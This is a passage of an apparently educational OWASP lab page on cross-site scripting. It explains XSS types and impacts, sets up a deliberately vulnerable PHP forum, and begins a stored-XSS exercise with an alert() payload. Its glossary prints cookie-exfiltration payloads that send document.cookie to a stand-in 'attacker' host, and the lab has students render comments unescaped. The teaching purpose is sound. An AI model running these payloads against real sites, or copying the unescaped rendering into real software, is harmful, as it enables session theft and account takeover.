@@ -1,0 +1,331 @@
+<!doctype html>
+<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-injection/xss" data-has-hydrated="false">
+<head>
+<meta charset="UTF-8">
+<meta name="generator" content="Docusaurus v3.9.1">
+<title data-rh="true">XSS | OWASP TOP 10 Labs</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://mehdiaitsaid.github.io/owasp-top-10-labs/img/logo.png"><meta data-rh="true" name="twitter:image" content="https://mehdiaitsaid.github.io/owasp-top-10-labs/img/logo.png"><meta data-rh="true" property="og:url" content="https://mehdiaitsaid.github.io/owasp-top-10-labs/labs/injection/xss"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="XSS | OWASP TOP 10 Labs"><meta data-rh="true" name="description" content="Cross-Site Scripting (XSS) is a class of web vulnerability that allows an attacker to inject malicious scripts into pages viewed by other users. When a victim’s browser renders that injected content, the attacker’s code runs with the same privileges as the legitimate page — enabling theft of session data, account takeover, defacement, phishing, or pivoting to other systems."><meta data-rh="true" property="og:description" content="Cross-Site Scripting (XSS) is a class of web vulnerability that allows an attacker to inject malicious scripts into pages viewed by other users. When a victim’s browser renders that injected content, the attacker’s code runs with the same privileges as the legitimate page — enabling theft of session data, account takeover, defacement, phishing, or pivoting to other systems."><link data-rh="true" rel="icon" href="/owasp-top-10-labs/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://mehdiaitsaid.github.io/owasp-top-10-labs/labs/injection/xss"><link data-rh="true" rel="alternate" href="https://mehdiaitsaid.github.io/owasp-top-10-labs/labs/injection/xss" hreflang="en"><link data-rh="true" rel="alternate" href="https://mehdiaitsaid.github.io/owasp-top-10-labs/labs/injection/xss" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"XSS","item":"https://mehdiaitsaid.github.io/owasp-top-10-labs/labs/injection/xss"}]}</script><link rel="stylesheet" href="/owasp-top-10-labs/assets/css/styles.a48fac3f.css">
+<script src="/owasp-top-10-labs/assets/js/runtime~main.bd5e239f.js" defer="defer"></script>
+<script src="/owasp-top-10-labs/assets/js/main.ffb82710.js" defer="defer"></script>
+</head>
+<body class="navigation-with-keyboard">
+<svg style="display: none;"><defs>
+<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
+</defs></svg>
+<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")),document.documentElement.setAttribute("data-theme-choice",t||"system")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/owasp-top-10-labs/img/logo.png"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/owasp-top-10-labs/"><div class="navbar__logo"><img src="/owasp-top-10-labs/img/logo.png" alt="OWASP TOP 10 Labs" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/owasp-top-10-labs/img/logo.png" alt="OWASP TOP 10 Labs" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">OWASP</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/owasp-top-10-labs/labs/intro">Labs</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/mehdiaitsaid/owasp-top-10-labs.git" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/owasp-top-10-labs/labs/intro"><span title="Introduction" class="linkLabel_WmDU">Introduction</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/owasp-top-10-labs/labs/setup"><span title="Setup" class="linkLabel_WmDU">Setup</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/owasp-top-10-labs/labs/broken-access-control"><span title="Broken Access Control" class="linkLabel_WmDU">Broken Access Control</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/owasp-top-10-labs/labs/cryptographic-failures"><span title="Cryptographic Failures" class="linkLabel_WmDU">Cryptographic Failures</span></a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" href="/owasp-top-10-labs/labs/injection/sql-injection"><span title="Injection" class="categoryLinkLabel_W154">Injection</span></a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/owasp-top-10-labs/labs/injection/sql-injection"><span title="SQL Injection" class="linkLabel_WmDU">SQL Injection</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/owasp-top-10-labs/labs/injection/xss"><span title="XSS" class="linkLabel_WmDU">XSS</span></a></li></ul></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/owasp-top-10-labs/labs/insecure-design"><span title="Insecure Design" class="linkLabel_WmDU">Insecure Design</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/owasp-top-10-labs/labs/security-misconfiguration"><span title="Security Misconfiguration" class="linkLabel_WmDU">Security Misconfiguration</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/owasp-top-10-labs/labs/vulnerable-outdated-components"><span title="Vulnerable and Outdated Components" class="linkLabel_WmDU">Vulnerable and Outdated Components</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/owasp-top-10-labs/labs/identification-authentication-failures"><span title="Identification and Authentication Failures" class="linkLabel_WmDU">Identification and Authentication Failures</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/owasp-top-10-labs/labs/software-data-integrity-failures"><span title="Software and Data Integrity Failures" class="linkLabel_WmDU">Software and Data Integrity Failures</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/owasp-top-10-labs/labs/logging-monitoring-failures"><span title="Security Logging and Monitoring Failures" class="linkLabel_WmDU">Security Logging and Monitoring Failures</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/owasp-top-10-labs/labs/ssrf"><span title="Server-Side Request Forgery (SSRF)" class="linkLabel_WmDU">Server-Side Request Forgery (SSRF)</span></a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/owasp-top-10-labs/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Injection</span></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">XSS</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>XSS (Cross-Site Scripting)</h1></header>
+<p>Cross-Site Scripting (XSS) is a class of web vulnerability that allows an attacker to inject malicious scripts into pages viewed by other users. When a victim’s browser renders that injected content, the attacker’s code runs with the same privileges as the legitimate page — enabling theft of session data, account takeover, defacement, phishing, or pivoting to other systems.</p>
+<p>This lab demonstrates XSS in a simple forum application. Students will exploit the comments field to perform stored XSS, observe its impact, and then learn practical mitigations.</p>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-is-xss">What is XSS?<a href="#what-is-xss" class="hash-link" aria-label="Direct link to What is XSS?" title="Direct link to What is XSS?" translate="no">​</a></h2>
+<p>Definition: XSS occurs when an application includes untrusted data in a web page without proper validation or escaping, causing that data to be interpreted as executable code by a user’s browser.</p>
+<p>Core idea: Untrusted input → inserted into HTML/JS/CSS context → browser executes it.</p>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="types-of-xss">Types of XSS<a href="#types-of-xss" class="hash-link" aria-label="Direct link to Types of XSS" title="Direct link to Types of XSS" translate="no">​</a></h2>
+<ul>
+<li><strong>Reflected XSS :</strong> Payload is delivered via a request (URL, form) and reflected back in the immediate response. Typically requires social engineering to get a victim to click a crafted link.</li>
+<li><strong>Stored (Persistent) XSS :</strong> Payload is saved on the server (database, logs, posts, comments) and served to many users later. High impact because a single injection can affect multiple victims.</li>
+<li><strong>DOM-based XSS :</strong> The vulnerability lives in client-side JavaScript which reads data from the DOM (e.g., location.search, location.hash, postMessage) and writes it back unsafely (e.g., innerHTML), causing execution without server involvement.</li>
+</ul>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="how-xss-is-exploited-high-level">How XSS is exploited (high level)<a href="#how-xss-is-exploited-high-level" class="hash-link" aria-label="Direct link to How XSS is exploited (high level)" title="Direct link to How XSS is exploited (high level)" translate="no">​</a></h2>
+<ol>
+<li><strong>Find an injection point</strong> : any input/field that is stored or reflected into a page (search fields, profile pages, comments, file uploads, headers).</li>
+<li><strong>Craft a payload</strong> <!-- -->:usually<!-- --> short JavaScript that demonstrates execution (e.g., alert(1)) or performs a real attack (steal cookies, perform actions).</li>
+<li><strong>Deliver the payload</strong> : store it (for stored XSS) or trick a victim into visiting a link (for reflected XSS).</li>
+<li><strong>Execute &amp; escalate</strong> : the browser runs the payload with privileges of the page (same-origin), enabling actions like reading document.cookie, making authenticated requests, or rendering a fake login form to phish credentials.</li>
+</ol>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="typical-impacts-of-xss">Typical impacts of XSS<a href="#typical-impacts-of-xss" class="hash-link" aria-label="Direct link to Typical impacts of XSS" title="Direct link to Typical impacts of XSS" translate="no">​</a></h2>
+<ul>
+<li>Session theft (read cookies or tokens that are accessible to JS).</li>
+<li>Account takeover by performing actions on behalf of the victim (CSRF-like actions using the victim’s authenticated session).</li>
+<li>Persistent browser-based keylogging or form-grabbers.</li>
+<li>Phishing / UI redressing (inject fake login forms).</li>
+<li>Pivot to internal networks if combined with SSRF or other flaws.</li>
+</ul>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="glossary--key-terms--definitions">Glossary — Key Terms &amp; Definitions<a href="#glossary--key-terms--definitions" class="hash-link" aria-label="Direct link to Glossary — Key Terms &amp; Definitions" title="Direct link to Glossary — Key Terms &amp; Definitions" translate="no">​</a></h2>
+<table><thead><tr><th>Term</th><th>Definition</th><th>Example / Notes</th></tr></thead><tbody><tr><td>XSS (Cross‑Site Scripting)</td><td>A class of vulnerability where an application includes untrusted data in a page that the browser executes as code.</td><td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code> executed when a page loads.</td></tr><tr><td>XSS vector</td><td>The input or entry point an attacker uses to inject malicious content.</td><td>Comment fields, URL parameters, file uploads.</td></tr><tr><td>Payload</td><td>Malicious script or markup injected by an attacker.</td><td><code>new Image().src=&quot;https://attacker/collect?c=&quot;+document.cookie</code></td></tr><tr><td>Stored XSS</td><td>XSS where payload is persisted on the server and served to other users later.</td><td>Comment saved in DB then executed for all viewers.</td></tr><tr><td>Reflected XSS</td><td>XSS where payload is immediately reflected in a response (often via URL), requiring victim to click a crafted link.</td><td><code>?q=&lt;script&gt;...&lt;/script&gt;</code> in a search page.</td></tr><tr><td>DOM‑based XSS</td><td>XSS that occurs entirely in client‑side JavaScript (no server-side injection).</td><td><code>location.hash</code> → <code>innerHTML</code> without sanitization.</td></tr><tr><td>Source (DOM)</td><td>Where attacker‑controlled data originates in the client (e.g., <code>location</code>, <code>document.cookie</code>).</td><td><code>location.search</code>, <code>postMessage</code> data.</td></tr><tr><td>Sink (DOM)</td><td>The API that causes execution when given attacker data (e.g., <code>innerHTML</code>, <code>eval</code>).</td><td><code>element.innerHTML = tainted</code> triggers execution.</td></tr><tr><td>Contextual output encoding</td><td>Escaping output according to the context (HTML, attribute, JS, URL, CSS).</td><td><code>htmlspecialchars()</code> for HTML body text.</td></tr><tr><td>Sanitization</td><td>Removing or filtering dangerous HTML/attributes, usually via a sanitizer library with an allowlist.</td><td>DOMPurify used to clean rich HTML.</td></tr><tr><td>HttpOnly cookie</td><td>A cookie flag that prevents JavaScript from reading the cookie via <code>document.cookie</code>.</td><td>Primary defense against JS-based cookie theft.</td></tr><tr><td>Secure cookie</td><td>A cookie flag that allows sending the cookie only over HTTPS.</td><td>Prevents cookie over plaintext HTTP.</td></tr><tr><td>SameSite</td><td>Cookie attribute limiting cross-site sending of cookies (<code>Lax</code>, <code>Strict</code>, <code>None</code>).</td><td>Mitigates some CSRF/exfiltration vectors.</td></tr><tr><td>Content Security Policy (CSP)</td><td>HTTP header that restricts allowed script sources, inline scripts, and network destinations.</td><td><code>Content-Security-Policy: default-src &#x27;self&#x27;;</code></td></tr><tr><td>Nonce / Hash (CSP)</td><td>A per-response token or hash allowing specific inline scripts under CSP.</td><td>Use <code>nonce-...</code> to permit approved inline scripts.</td></tr><tr><td>Template engine</td><td>Server-side tool that renders templates and ideally auto-escapes variables.</td><td>Jinja2, Handlebars, Razor — enable autoescape.</td></tr><tr><td>Rich‑text editor</td><td>Client-side WYSIWYG editor that outputs HTML (must be sanitized server-side).</td><td>CKEditor, TinyMCE — sanitize server-side.</td></tr><tr><td>Encoder</td><td>Library/function that escapes data for a specific context.</td><td>HTML encoder, JS-string encoder, URL encoder.</td></tr><tr><td>Cookie theft / exfiltration</td><td>Action of sending readable cookies or tokens to an attacker-controlled endpoint.</td><td><code>fetch(&#x27;https://attacker/collect&#x27;,{method:&#x27;POST&#x27;,body:...})</code></td></tr><tr><td>Session hijacking</td><td>Using stolen session tokens/cookies to impersonate a user.</td><td>Replay stolen session cookie in another browser.</td></tr><tr><td>Input validation</td><td>Checking incoming data for allowed format/values (defense-in-depth).</td><td>Reject overly long or malformed inputs.</td></tr><tr><td>Output escaping</td><td>The act of encoding data right before rendering into a specific context.</td><td>Always escape before writing into HTML.</td></tr><tr><td>Principle of least privilege</td><td>Design principle: give users/components the smallest privileges necessary.</td><td>Limit what a script or user can do.</td></tr><tr><td>Allowlist (whitelist)</td><td>A safe list of permitted tags/attributes when sanitizing HTML.</td><td>Allow <code>&lt;b&gt;</code>, <code>&lt;i&gt;</code>, disallow <code>&lt;script&gt;</code>.</td></tr><tr><td>Defense‑in‑depth</td><td>Multiple layers of security controls (client + server + headers + cookies).</td><td>Combine sanitization, HttpOnly cookies, CSP, and logging.</td></tr></tbody></table>
+<h1>Learning objectives for this lab</h1>
+<ul>
+<li>Identify where untrusted input reaches the rendered page (attack surface mapping).</li>
+<li>Differentiate reflected, stored, and DOM XSS in practice.</li>
+<li>Execute a controlled stored XSS proof-of-concept in the forum comments.</li>
+<li>Implement and verify mitigations: contextual output encoding, safe DOM APIs, sanitization, and CSP.</li>
+<li>Appreciate responsible disclosure and safe lab practices (only test in authorized environments).</li>
+</ul>
+<h1>Lab Use Case — Attack Scenario (Forum comment stored XSS)</h1>
+<p>In this lab we’ll demonstrate a stored XSS attack in a simple forum by injecting JavaScript into the comments field. Students will see three concrete effects in a controlled environment:</p>
+<ol>
+<li>executing visible messages in the victim’s browser (e.g., alert()),</li>
+<li>modifying the page DOM (inserting or changing elements), and</li>
+<li>simulating cookie theft (sending cookie data to a lab-controlled collector).</li>
+</ol>
+<p>After the attack exercises, students will implement and verify mitigations using frontend and backend validation, and learn how to safely integrate and validate content from a rich-text editor (for example, CKEditor) on the server side.</p>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="scenario-overview">Scenario overview<a href="#scenario-overview" class="hash-link" aria-label="Direct link to Scenario overview" title="Direct link to Scenario overview" translate="no">​</a></h2>
+<p>Attacker (student A) logs in and posts a comment containing a malicious payload (stored in the database).</p>
+<p>Victim (student B) visits the post page; the page renders the stored comment and the injected script runs in the victim’s browser.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="observed-effects-demonstrations">Observed effects (demonstrations):<a href="#observed-effects-demonstrations" class="hash-link" aria-label="Direct link to Observed effects (demonstrations):" title="Direct link to Observed effects (demonstrations):" translate="no">​</a></h3>
+<ul>
+<li>Message: a simple <code>alert(&#x27;XSS&#x27;)</code> shows that code executed.</li>
+<li>DOM modification: injected script inserts or replaces page elements (e.g., adds a banner or form).</li>
+<li>Simulated data exfiltration: script sends <code>document.cookie</code> (or another demo value) to a collector URL under instructor control.</li>
+</ul>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="lab-setup">Lab Setup<a href="#lab-setup" class="hash-link" aria-label="Direct link to Lab Setup" title="Direct link to Lab Setup" translate="no">​</a></h2>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="step-1--setup-the-database">Step 1 — Setup the database<a href="#step-1--setup-the-database" class="hash-link" aria-label="Direct link to Step 1 — Setup the database" title="Direct link to Step 1 — Setup the database" translate="no">​</a></h3>
+<p>Create a new database named forum_lab, then reproduce the tables and relationships exactly as represented in the model  (MPD) shown in the figure below using phpMyAdmin or any other database management tool of your choice. Make sure to define the correct data types, primary keys, and foreign key relationships between users, posts, and comments.</p>
+<p>Once the database structure is complete, insert a few dummy records manually to prepare for testing in the next steps.</p>
+<p><img decoding="async" loading="lazy" alt="xss" src="/owasp-top-10-labs/assets/images/xss_db-39eaf63844ee39bd5eb887354dc52da2.png" width="1782" height="1810" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="step-2--create-the-login-page">Step 2 — Create the Login page<a href="#step-2--create-the-login-page" class="hash-link" aria-label="Direct link to Step 2 — Create the Login page" title="Direct link to Step 2 — Create the Login page" translate="no">​</a></h3>
+<p>Build a login page that authenticates users against the users table and starts a session.</p>
+<p><strong>Tasks:</strong></p>
+<ol>
+<li>Create login.php (or equivalent) with a form for username and password.</li>
+<li>Implement server-side authentication: query the users table and verify credentials.</li>
+<li>On successful login, store user information (ID, username, role) in the session and redirect to the posts page.</li>
+<li>On failure, show a friendly error message and allow retry.</li>
+<li>Provide a logout link/page that destroys the session.</li>
+</ol>
+<p><img decoding="async" loading="lazy" alt="img.png" src="/owasp-top-10-labs/assets/images/img-2fed60e7d548f145338155b7742f0398.png" width="2559" height="1366" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="step-3--create-the-posts-page-list-of-posts">Step 3 — Create the Posts page (list of posts)<a href="#step-3--create-the-posts-page-list-of-posts" class="hash-link" aria-label="Direct link to Step 3 — Create the Posts page (list of posts)" title="Direct link to Step 3 — Create the Posts page (list of posts)" translate="no">​</a></h3>
+<p>Show all posts with author and a link to each single-post view.</p>
+<p><strong>Tasks:</strong></p>
+<ol>
+<li>Create posts.php that lists posts in reverse chronological order.</li>
+<li>For each post show: title, author username, created timestamp, and a snippet or the first lines of body.</li>
+<li>Make the title (or a “View” link) point to the single post page (e.g., &quot;post.php?id=&lt;post_id&gt;)&quot;.</li>
+<li>Display the currently logged-in username and a logout link.</li>
+</ol>
+<p><img decoding="async" loading="lazy" alt="img_1.png" src="/owasp-top-10-labs/assets/images/img_1-297c3ad50958e492c09019b116a82583.png" width="2559" height="1362" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="step-4--create-the-single-post-page-with-comments-and-add-comment-form">Step 4 — Create the Single Post page with Comments and Add Comment form<a href="#step-4--create-the-single-post-page-with-comments-and-add-comment-form" class="hash-link" aria-label="Direct link to Step 4 — Create the Single Post page with Comments and Add Comment form" title="Direct link to Step 4 — Create the Single Post page with Comments and Add Comment form" translate="no">​</a></h3>
+<p>Implement the post detail page where users can view comments and add a new comment (this is the XSS attack surface).</p>
+<p><strong>Tasks:</strong></p>
+<ol>
+<li>Create post.php?id=&lt;post_id&gt; that shows the full post (title, body, author, timestamp).</li>
+<li>Fetch and display all comments for that post, showing commenter username and comment content.</li>
+<li>Add a form under the comments section that allows logged-in users to submit a new comment (textarea + submit button).</li>
+<li>On comment submission, insert the comment into the comments table with the current user id and redirect back to the same post so the newly added comment appears.</li>
+<li>Ensure the page is accessible only to logged-in users.</li>
+</ol>
+<p><img decoding="async" loading="lazy" alt="img_2.png" src="/owasp-top-10-labs/assets/images/img_2-d29d3a201df3bdaf9f647c83cf41f587.png" width="2559" height="1351" class="img_ev3q"></p>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="attack-simulations">Attack simulations<a href="#attack-simulations" class="hash-link" aria-label="Direct link to Attack simulations" title="Direct link to Attack simulations" translate="no">​</a></h2>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="1-simple-message-stored-xss-alert">1. Simple message (stored XSS alert)<a href="#1-simple-message-stored-xss-alert" class="hash-link" aria-label="Direct link to 1. Simple message (stored XSS alert)" title="Direct link to 1. Simple message (stored XSS alert)" translate="no">​</a></h3>
+<p>Objective: Demonstrate a stored XSS that executes a visible message in a victim’s browser (benign alert()), using the forum comment field as the injection point.</p>
+<p><strong>Preconditions</strong></p>
+<ul>
+<li>Database (forum_lab) and web app from Steps 1–4 are running.</li>
+<li>You have at least two user accounts (use one as Attacker and another as Victim).</li>
+<li>The post detail page renders comment content without escaping (this is the lab setup).</li>
+</ul>
+<h4 class="anchor anchorWithStickyNavbar_LWe7" id="attack-steps">Attack steps<a href="#attack-steps" class="hash-link" aria-label="Direct link to Attack steps" title="Direct link to Attack steps" translate="no">​</a></h4>
+<ol>
+<li><strong>Authenticate as the Attacker :</strong> Log in with the attacker account (e.g., moderator or any non-victim account).</li>
+<li><strong>Open a target post :</strong> Navigate to one of the existing posts (the page created in Step 4).</li>
+<li>Submit a comment containing a benign script payload <!-- -->:In<!-- --> the comment textarea, enter the payload:</li>
+</ol>
+<div class="language-html codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-html codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">script</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token script language-javascript function" style="color:#d73a49">alert</span><span class="token script language-javascript punctuation" style="color:#393A34">(</span><span class="token script language-javascript string" style="color:#e3116c">&#x27;XSS — stored&#x27;</span><span class="token script language-javascript punctuation" style="color:#393A34">)</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">script</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre></div></div>
+<ol start="4">
+<li><strong>Verify storage :</strong> Confirm the comment appears in the comments list (it should show the payload as stored text in the DB).</li>
+<li><strong>Switch to the Victim :</strong> In a different browser or an incognito window (so you’re not the same session), log in as the Victim (or simply visit the post page if comments are public).</li>
+<li><strong>View the post page as Victim :</strong> Open the same post. When the page loads and renders the stored comment, you should see a browser alert pop up with the message XSS — stored.</li>
+</ol>
+<h4 class="anchor anchorWithStickyNavbar_LWe7" id="expected-result">Expected result<a href="#expected-result" class="hash-link" aria-label="Direct link to Expected result" title="Direct link to Expected result" translate="no">​</a></h4>
+<ul>
+<li>The alert() dialog with the message XSS — stored appears in the victim’s browser when viewing the post.</li>
+<li>The comment containing the script is stored in the database (confirmable via phpMyAdmin if desired).</li>
+<li>This proves that untrusted input saved in the DB is being executed when rendered — i.e., stored XSS.</li>
